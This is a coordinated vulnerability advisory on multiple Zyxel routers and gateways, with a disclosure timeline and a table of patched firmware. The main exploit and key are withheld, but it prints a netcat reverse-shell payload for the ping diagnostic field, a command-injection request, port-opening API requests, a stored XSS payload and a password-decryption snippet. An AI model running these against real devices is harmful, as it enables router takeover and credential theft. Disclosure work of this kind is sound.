@@ -1,0 +1,658 @@
+id: 37368
+date: 02/17/2022
+title: Zyxel Buffer Overflow / File Disclosure / CSRF / XSS / Broken Access Control Vulnerabilities
+author: Stefan Viehbock
+cves: 
+
+=======================================================================
+               title: Multiple Critical Vulnerabilities
+             product: Multiple Zyxel devices
+  vulnerable version: For affected products see "Solution" section
+       fixed version: see "Solution" section
+          CVE number: -
+              impact: Critical
+            homepage: https://www.zyxel.com
+               found: 2020-11-27
+                  by: G. Hechenberger (Office Vienna)
+                      S. Robertz (Office Vienna)
+                      S. Viehböck (Office Vienna)
+                      T. Weber (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+
+"Focused on innovation and customer-centricity, Zyxel Communications Corp. has
+been connecting people to the internet for nearly 30 years. We keep promoting
+creativity which meets the needs of customers. This spirit has never been
+changed since we developed the world's first integrated 3-in-1 data/fax/voice
+modem in 1992. Our ability to adapt and innovate with networking technology
+places us at the forefront of understanding connectivity for telco/service
+providers, businesses and home users.
+
+We're building the networks of tomorrow, helping unlock the world's potential
+and meeting the needs of the modern workplace; powering people at work, life
+and play. We stand side-by-side with our customers and partners to share new
+approaches to networking that will unleash their abilities. Loyal friend,
+powerful ally, reliable resource — we are Zyxel, Your Networking Ally."
+
+Source: https://www.zyxel.com/about_zyxel/company_overview.shtml
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends Zyxel customers to upgrade the firmware to the latest
+version available.
+
+The collaboration between Zyxel Communications and SEC Consult will further strengthen
+Zyxel's cybersecurity strategy by accelerating and optimizing the ability to respond
+to threats and vulnerabilities like those described in this advisory.
+
+https://sec-consult.com/blog/detail/zyxel-communications-and-sec-consult-reach-next-level-of-cybersecurity/
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Multiple Unauthenticated Buffer Overflows in zhttpd and libclinkc.so
+Multiple unauthenticated buffer overflows have been discovered in the zhttpd web
+server. One buffer overflow is extremely simple to trigger as it occurs in the
+URI input. In case of an overlong input, the web server crashes as the return
+address is overwritten with the input values as the function scanf() without
+length check was used. Multiple other buffer overflows can be found in the fol-
+lowing functionalities:
+* URI parsing in libclinkc.so, if '?' is contained.
+* Export_Log functionality.
+
+An attacker can take over the device by using the return-to-zero-protection
+technique as ASLR in the used Linux kernel is activated system-wide and the NX
+bit is set for the web server binary. Other protection mechanisms like PIE,
+stack canaries and relocation read only were not set. The address of libc
+shifts due to ASLR and must be brute-forced therefore. This can take up to one
+hour. However, on average, an attacker will gain a root shell in less than
+30 minutes.
+
+
+2) Unauthenticated Local File Disclosure in zhttpd
+An endpoint in zhttpd can be used to expose system files including
+"/etc/passwd" and "/etc/shadow". This endpoint is accessible without prior
+login. An attacker can read all files on the system by using this endpoint.
+
+
+3) Unsafe Storage of Sensitive Data
+The device configuration contains passwords stored in a reversible form. Rather
+than storing passwords in an appropriate cryptographic hash format, the
+passwords are encrypted with a symmetric cipher (AES) using a static key. An
+attacker with access to the device configuration (e.g. by exploiting vulnerability
+  #2) can decrypt the passwords and use them in further attacks.
+
+
+4) Authenticated Command Injection
+Two command injections were found within the device. One was identified in the
+ping diagnostic tool, the other one at the certificate upload. Both led to a
+fully compromised system as the web service was started with root permissions.
+
+It is suspected that more command injections are present in the web interface
+of the device.
+
+
+5) Broken Access Control
+Various access control vulnerabilities were identified where a lower privileged
+user can access functionality of a higher privilege role.
+Some functionality is visible in the GUI only if using a user account with full
+access permissions. However, it is not visible as standard "admin" user with the
+role administrator. It can be exploited, e.g., to open ports for system services
+such as SSH and FTP and also to access other functionality intended to be used
+by users with full access only.
+
+
+6) Processing of Symbolic Links in ftpd
+The FTP server on the device processes symbolic links on external storage
+media, e.g. formatted as NTFS. By creating a symbolic link to the root directory,
+this can be abused to get read access to the root file system.
+
+
+7) Inadequate CSRF Implementation
+The web interface provides CSRF tokens, which are implemented as 9-digit
+numbers and are transmitted as "sessionkey" parameter. CSRF tokens rely on
+unpredictability to fulfill their function. However, an API endpoint exists on
+the device, which can be used in an unauthenticated manner to generate and
+retrieve a new and valid CSRF token value over the internal network.
+
+
+8) Stored Cross-Site Scripting
+A stored cross-site scripting vulnerability was identified in the printer name
+field of the print server menu within the web interface of the device. However,
+the possible payload is limited to 32 characters and certain tags.
+
+
+Proof of concept:
+-----------------
+1) Multiple Unauthenticated Buffer Overflows in zhttpd and libclinkc.so
+
+URI parsing pseudo code in zhttpd:
+-------------------------------------------------------------------------------
+char path [256];
+[...]
+__s = (char *)cg_http_request_geturi(param_1);
+pcVar2 = strstr(__s,"Export_Log");
+if (pcVar2 != (char *)0x0) {
+__isoc99_sscanf(__s,"%*[^?]?%s",path);
+return;
+}
+-------------------------------------------------------------------------------
+This code will copy everything following a '?' from the URI to a 256 byte
+buffer. As URIs are commonly allowed to contain 2048 characters, the 'path'
+buffer can be overflown.
+
+Proof of concept exploit that will obtain a root shell:
+-------------------------------------------------------------------------------
+< the remote root exploit has been removed from this advisory and will be
+   published at a later date >
+-------------------------------------------------------------------------------
+
+URI handling pseudo code, when '?' is present, in libclinkc.so, which is called
+from zhttpd:
+-------------------------------------------------------------------------------
+char acStack144 [128];
+pcVar2 = strchr(uri_ptr,'?');
+if (pcVar2 != (char *)0x0) {
+memset(acStack144,0,0x80);
+strncpy(acStack144,uri_ptr,(size_t)(pcVar2 + -(int)uri_ptr));
+-------------------------------------------------------------------------------
+This buffer can be overflown even though strncpy is used, as the copy length
+parameter 'n' is user controlled. The attacker will need to request a URL with
+more than 128 characters and will then append a '?'.
+
+
+2) Unauthenticated Local File Disclosure in zhttpd
+The endpoint "Export_Log" can be used to fetch arbitrary files as shown in the
+following request that accesses the config file "/data/zcfg_config.json":
+-------------------------------------------------------------------------------
+< POC removed from this advisory >
+-------------------------------------------------------------------------------
+
+This endpoint is accessible without prior authentication!
+
+The file '/data/zcfg_config.json' will contain the running configuration of the
+router, including all passwords such as SIP credentials!
+
+
+3) Unsafe Storage of Sensitive Data
+There is a proprietary password format by Zyxel denoted by the prefix
+"_encrypt_". This is implemented by the function encryptPassword in the binary
+"/bin/zcmd". Values in the configuration fields named "Privilege", "Password",
+"DefaultPassword" and "OldDefaultPassword" are passed to a function that
+derives an AES key using the OpenSSL function EVP_BytesToKey from static data.
+The following code snippets are a re-implementation of the key derivation
+algorithm. The key has been removed from this advisory.
+-------------------------------------------------------------------------------
+unsigned char salt[] = { 0xXX,0xXX,0xXX,0xXX,0xXX,0xXX,0xXX,0xXX };
+int encrypt_key_length;
+char encryptKey[]= "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
+encrypt_key_length = strlen(encryptKey);
+unsigned char key[EVP_MAX_KEY_LENGTH], iv[EVP_MAX_IV_LENGTH];
+int datal = encrypt_key_length;
+EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha1(), (const unsigned char*)salt,
+(const unsigned char*)encryptKey, datal,5,key,iv);
+for (int i = 0;i <= EVP_MAX_KEY_LENGTH;i++) {
+printf("%02X", key[i]);
+}
+printf("\n");
+for (int i = 0;i <= EVP_MAX_IV_LENGTH;i++) {
+printf("%02X", iv[i]);
+}
+-------------------------------------------------------------------------------
+The input for the key derivation is static, so the resulting key and IV are
+too. Based on the information the following Python snippet was developed that
+decrypts password entries (the key has been removed from this advisory):
+-------------------------------------------------------------------------------
+def decrypt_zyxel_encrypt(input):
+key=bytearray.fromhex(
+'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+iv=bytearray.fromhex('XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+input=input.replace('_encrypt_','')
+decoded = b64decode(input)
+aes = AES.new(key, AES.MODE_CBC,iv)
+decrypted=aes.decrypt(decoded)
+print(repr(decrypted))
+-------------------------------------------------------------------------------
+Decrypting the password can be done with the following command:
+ >> decrypt_zyxel_encrypt('_encrypt_xxxxxxxxxxxxxxxxx==')
+
+The same password algorithm was discussed in the context of security research
+on the Zyxel VMG8825-T50 before:
+https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/
+
+
+4) Authenticated Command Injection
+The input vulnerable to command injection can be found in the menu at
+MENU->Maintenance->Diagnostic. The following payload can now be used in the IP
+address field to create a reverse shell:
+127.0.0.1;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc Attacker-IP Attacker-Port >/tmp/f &
+
+The second identified possibility for a command injection was the certificate
+upload. The endpoint is not visible from the UI for a regular user, however
+due to the broken access control, see 6), every user can interact with it.
+
+-------------------------------------------------------------------------------
+POST /cgi-bin/Certificates?action=import_local&priv=;touch${IFS}foo&sessionkey=409106100 HTTP/1.1
+Host: <IP>
+Connection: close
+Content-Length: 1498
+Content-Type: multipart/form-data; boundary=----
+WebKitFormBoundarywlxAsQZ1maK9V9E9
+Accept: */*
+Origin: https://<IP>
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://<IP>/Certificates
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: Session=uUgQobZKw5cUzesePtCAGhyxH3SOCE8W
+------WebKitFormBoundarywlxAsQZ1maK9V9E9
+Content-Disposition: form-data; name="certImportFileName";
+filename="ZyXELcert.crt"
+Content-Type: application/pkix-cert
+-----BEGIN CERTIFICATE-----
+[...]
+-----END CERTIFICATE-----
+------WebKitFormBoundarywlxAsQZ1maK9V9E9—
+-------------------------------------------------------------------------------
+
+5) Broken Access Control
+
+As a first example, available user accounts and their privileges can be viewed
+by sending a request the following API endpoint:
+https://<IP>/cgi-bin/DAL?oid=login_privilege
+The response shows usernames invisible in the GUI, here e.g., the "root" user.
+-------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Content-Type: application/json
+Content-Length: 2906
+Date: Thu, 01 Jan 1970 22:59:49 GMT
+X-Frame-Options: sameorigin
+Content-Security-Policy: frame-ancestors 'self'
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+{
+"result": "ZCFG_SUCCESS",
+"ReplyMsg": "Page",
+"ReplyMsgMultiLang": "",
+"Object": [
+{
+"Index0": 1,
+"Index1": 1,
+"Enabled": true,
+"Username": "root",
+"Password": "",
+"EnableQuickStart": true,
+"Privilege": "login"
+},
+[...]
+-------------------------------------------------------------------------------
+As a second example, the status of system services can be viewed by sending a
+request to the following API endpoint:
+https://<IP>/cgi-bin/DAL?oid=mgmt_srv
+The response shows various system services, here e.g., the SSH service which
+is only open for a trusted domain ("Trust_Dm").
+-------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Content-Type: application/json
+Content-Length: 1271
+Date: Thu, 01 Jan 1970 02:18:28 GMT
+X-Frame-Options: sameorigin
+Content-Security-Policy: frame-ancestors 'self'
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+{
+"result": "ZCFG_SUCCESS",
+"ReplyMsg": "RestartDeamon",
+"ReplyMsgMultiLang": "",
+"Object": [
+[...]
+{
+"Index": 5,
+"Name": "SSH",
+"Port": 22,
+"Mode": "Trust_Dm",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,"
+},
+[...]
+-------------------------------------------------------------------------------
+Subsequently, services can also be opened. An example request to open the FTP,
+SSH and SNMP ports is given below. The request has to be sent in context of an
+"admin" user and has to contain a valid "sessionkey" value.
+-------------------------------------------------------------------------------
+PUT /cgi-bin/DAL?oid=mgmt_srv&sessionkey=575595380 HTTP/1.1
+Host: <IP>
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+If-Modified-Since: Thu, 01 Jun 1970 00:00:00 GMT
+X-Requested-With: XMLHttpRequest
+Content-Length: 2097
+Origin: https://<IP>
+Connection: close
+Referer: https://<IP>/RemoteManagement
+Cookie: Session=6snfyaikMK5FmMcerni8cJEnzl4IgaFc
+[
+{
+"Index": 1,
+"Name": "HTTP",
+"Port": 80,
+"Mode": "LAN_ONLY",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,,,,",
+"LANEnable": true,
+"WLANEnable": true,
+"WANEnable": false,
+"TrustDmEnable": false,
+"Protocol": "https",
+"RestartDeamon": false
+},
+{
+"Index": 2,
+"Name": "HTTPS",
+"Port": 443,
+"Mode": "LAN_TstDm",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,,,,",
+"LANEnable": true,
+"WLANEnable": true,
+"WANEnable": false,
+"TrustDmEnable": true,
+"Protocol": "https",
+"RestartDeamon": false
+},
+{
+"Index": 3,
+"Name": "FTP",
+"Port": 21,
+"Mode": "LAN_ONLY",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,,,,",
+"LANEnable": true,
+"WLANEnable": true,
+"WANEnable": false,
+"TrustDmEnable": false,
+"Protocol": "https",
+"RestartDeamon": false
+},
+{
+"Index": 4,
+"Name": "TELNET",
+"Port": 23,
+"Mode": "",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,,,,",
+"LANEnable": true,
+"WLANEnable": true,
+"WANEnable": false,
+"TrustDmEnable": false,
+"Protocol": "https",
+"RestartDeamon": false
+},
+{
+"Index": 5,
+"Name": "SSH",
+"Port": 22,
+"Mode": "LAN_TstDm",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,,,,",
+"LANEnable": true,
+"WLANEnable": true,
+"WANEnable": false,
+"TrustDmEnable": true,
+"Protocol": "https",
+"RestartDeamon": false
+},
+{
+"Index": 6,
+"Name": "SNMP",
+"Port": 161,
+"Mode": "LAN_ONLY",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,,,,",
+"LANEnable": true,
+"WLANEnable": true,
+"WANEnable": false,
+"TrustDmEnable": false,
+"Protocol": "https",
+"RestartDeamon": false
+},
+{
+"Index": 7,
+"Name": "PING",
+"Port": -1,
+"Mode": "LAN_TstDm",
+"BoundInterfaceList":
+"IP.Interface.9,IP.Interface.7,IP.Interface.5,IP.Interface.4,IP.Interface.3,,
+,,IP.Interface.11,,,,",
+"LANEnable": true,
+"WLANEnable": true,
+"WANEnable": false,
+"TrustDmEnable": true,
+"Protocol": "https",
+"RestartDeamon": false,
+"origport": 443,
+"otherorigport": 80,
+"httpport": 80,
+"httpsport": 443
+}
+]
+-------------------------------------------------------------------------------
+The response will indicate success and the system will be restarted. Another
+request to the API endpoint used before to query the service status will list
+the changed SSH mode, now shown as "LAN_TstDm".
+
+
+6) Processing of Symbolic Links in ftpd
+A prepared USB stick, formatted as NTFS and containing a link to the root file
+system (created by executing "ln -s / sysroot") is needed to exploit this vul-
+nerability.
+
+After placing the USB stick in the USB port of the device, it is automatically
+mounted to the admin user's home directory. By using the access control vulne-
+rability, described in 6), the FTP port can be opened to allow FTP access via
+the internal network.
+
+After connecting to the FTP service using the "admin" credentials, the mounted
+USB stick can be accessed and the "sysroot" symbolic link will show the
+content of the root file system.
+
+
+7) Inadequate CSRF Implementation
+The following API endpoint can be used without authentication to retrieve a
+new CSRF token:
+https://<IP>/changeSessionKey
+The response contains the new session key, valid for all user accounts. The
+current one will be invalidated.
+-------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 43
+Date: Thu, 01 Jan 1970 12:29:50 GMT
+X-Frame-Options: sameorigin
+Content-Security-Policy: frame-ancestors 'self'
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+[
+{
+"SessionKey": 583723980
+}
+]
+-------------------------------------------------------------------------------
+
+8) Stored Cross-Site Scripting
+By browsing to "MENU->Network Setting->USB Service->Print Server", the field
+"User Defined Printer Name" can be used to place a stored cross-site scripting
+payload. The following code was used as proof-of-concept:
+
+P<img src=x onerror=alert('XSS')>
+
+In a PUT request, this action looks like the following listing in the proxy:
+-------------------------------------------------------------------------------
+PUT /cgi-bin/DAL?oid=print_server&sessionkey=578218320 HTTP/1.1
+Host: <IP>
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+If-Modified-Since: Thu, 01 Jun 1970 00:00:00 GMT
+X-Requested-With: XMLHttpRequest
+Content-Length: 106
+Origin: <IP>
+Connection: close
+Cookie: activeMenuID=maintain_settings; activeSubmenuID=log;
+Session=Fg2kSHIfZW5mhySEY4vJfrElXE4TSLEl
+{
+"Enable":false,
+"IppMake":"PRINTER",
+"IppDevice":"/dev/printer0",
+"IppName":"P<img src=x onerror=alert('XSS')>"
+}
+-------------------------------------------------------------------------------
+The printer name will be stored and displayed on the same page, executing the
+payload.
+
+
+Vulnerable / tested versions:
+-----------------------------
+Multiple devices are affected. See section "solution" for the list of affected models
+provided by the vendor including the patched firmware version. All firmware older than
+those listed are affected.
+
+
+Vendor contact timeline:
+------------------------
+2021-01-21 | Contacting vendor via security@zyxel.com.tw. Received confirmation
+              from Zyxel employee.
+2021-02-09 | Zyxel confirms vulnerabilities and is working on a fix. Zyxel asks
+              for more time; extended advisory disclosure date to 2021-05-20.
+2021-04-09 | Asked for an update.
+2021-04-13 | Zyxel stated that updates on the issues will be provided soon.
+2021-04-28 | Phone call with Zyxel. Zyxel contact stated that all issues were
+              resolved.
+2021-05-01 | Zyxel stated that a status update will follow in the next weeks.
+2021-05-19 | Zyxel PSIRT sent a list with feedback to all discovered issues.
+2021-06-01 | Zyxel PSIRT updated the list and added a patch plan including timing.
+              Updates the earliest updates on the security issues were scheduled
+              for Q3 2021.
+2021-09-02 | Status meeting with Zyxel. The advisory disclosure shifts back to
+              Q4 2021 due to more affected products.
+2021-11-07 | Security advisory disclosure plan discussion with Zyxel. Vendor stated
+              that more products must be internally reviewed. The advisory can be released
+              in Q1 2022 if no further devices are affected .
+2022-01-25 | Asking vendor regarding coordinated advisory release date.
+2022-02-03 | Asking vendor again for a status update.
+2022-02-07 | Vendor reply that affected models are still being consolidated.
+2022-02-10 | Received final list of affected models.
+2022-02-15 | Zyxel publishes their security advisory.
+2022-02-15 | Coordinated release of security advisory.
+
+
+Solution:
+---------
+Install the current version of the firmware for the affected product. According to the
+vendor, the following firmware versions fix the identified security issues:
+
+Affected EOL products (list not necessarily complete) which will not get an update:
+
+AMG1302-T11C           EOL
+VMG3925-B10C           EOL
+VMG8924-B10D           EOL
+VMG1312-B10D           EOL
+VMG3312-T20A           EOL
+VMG3625-T20A           EOL
+VMG3925-B10B           EOL
+VMG3925-B10C           EOL
+VMG3925-B30C           EOL
+VMG3926-B10A           EOL
+VMG5313-B10B           EOL
+VMG5313-B30B           EOL
+VMG8623-T50A           EOL
+VMG8823-B10B           EOL
+VMG8823-B30B           EOL
+VMG8823-B50B           EOL
+VMG8823-B60B           EOL
+VMG8924-B10D           EOL
+VMG8924-B30D           EOL
+PMG5317-T20A           EOL
+
+
+Affected product       Model / Patch availability
+CPE:
+DX3301-T0              V5.50(ABVY.3)C0 in Sep. 2022*
+DX5401-B0              V5.17(ABYO.1)C0*
+EMG3525-T50B           EMEA - V5.50(ABPM.6)C0*
+                        S. America - V5.50(ABSL.0)b12 in Sep. 2022*
+EMG5523-T50B           EMEA - V5.50(ABPM.6)C0*
+                        S. America - V5.50(ABSL.0)b12 in Sep. 2022*
+EMG5723-T50K           V5.50(ABOM.7)C0*
+EX3301-T0              V5.50(ABVY.3)C0 in Sep. 2022*
+EX5401-B0              V5.17(ABYO.1)C0*
+EX5501-B0              V5.17(ABRY.2)C0*
+LTE3301-PLUS           V1.00(ABQU.3)C0*
+LTE7240-M403           V2.00(ABMG.4)C0*
+VMG1312-T20B           V5.50(ABSB.5)C0*
+VMG3625-T50B           V5.50(ABPM.6)C0*
+VMG3927-B50A           V5.17(ABMT.6)C0*
+VMG3927-B60A           V5.17(ABMT.6)C0*
+VMG3927-T50K           V5.50(ABOM.7)C0*
+VMG4005-B50A           V5.15(ABQA.2)C0 in Mar. 2022*
+VMG8623-T50B           V5.50(ABPM.6)C0*
+VMG8825-B50A           V5.17(ABMT.6)C0*
+VMG8825-B50B           V5.17(ABNY.7)C0*
+VMG8825-B60A           V5.17(ABMT.6)C0*
+VMG8825-B60B           V5.17(ABNY.7)C0*
+VMG8825-T50K           V5.50(ABOM.7)C0*
+XMG3927-B50A           V5.17(ABMT.6)C0*
+XMG8825-B50A           V5.17(ABMT.6)C0*
+
+Firewall:
+VPN2S                  V1.20(ABLN.2)_00210319C1*
+
+ONT:
+AX7501-B0              V5.17(ABPC.1)C0*
+EP240P                 V5.40(ABVH.1)C0 in May 2022*
+PMG5317-T20B           V5.40(ABKI.4)C0 in Apr. 2022*
+PMG5617GA              V5.40(ABNA.2)C0 in Apr. 2022*
+PMG5622GA              V5.40(ABNB.2)C0 in Apr. 2022*
+
+WiFi extender:
+WX3100-T0              V5.50(ABVL.1)C0 in Mar. 2022*
+WX3401-B0              V5.17(ABVE.1)C0*
+
+WiFi system:
+WSQ50 (Multy X)        V2.20(ABKJ.7)C0
+WSQ60 (Multy Plus)     V2.20(ABND.8)C0
+
+*Please reach out to your local Zyxel support team for the updated firmware file.
+
+
+For further information, please see the vendor's advisory as well:
+https://www.zyxel.com/support/Zyxel-security-advisory-for-multiple-vulnerabilities.shtml
+
+Page from the vendor regarding affected devices:
+https://www.zyxel.com/support/Zyxel-security-advisory-for-multiple-vulnerabilities_Products.shtml
+
+#  0day.today [2023-03-23]  #
